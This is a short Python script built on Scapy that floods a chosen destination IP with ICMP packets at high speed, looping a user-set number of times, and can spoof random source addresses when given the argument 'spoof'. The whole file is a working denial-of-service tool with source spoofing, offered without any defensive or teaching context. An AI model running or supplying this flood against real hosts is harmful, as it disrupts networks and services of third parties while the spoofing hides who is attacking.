#!/usr/bin/env python
from scapy.all import IP, ICMP, sendpfast, RandIP
import sys
import random

def ping_flood(dst_ip, src_ip, amount):
    icmp = IP(src=src_ip, dst=dst_ip) / ICMP()
    sendpfast(icmp, loop=amount)

if __name__ == "__main__":
    src_ip = sys.argv[1]
    dst_ip = sys.argv[2]
    amount = int(sys.argv[3])
    if src_ip == "spoof":
        src_ip = RandIP()
    
    ping_flood(dst_ip, src_ip, amount)


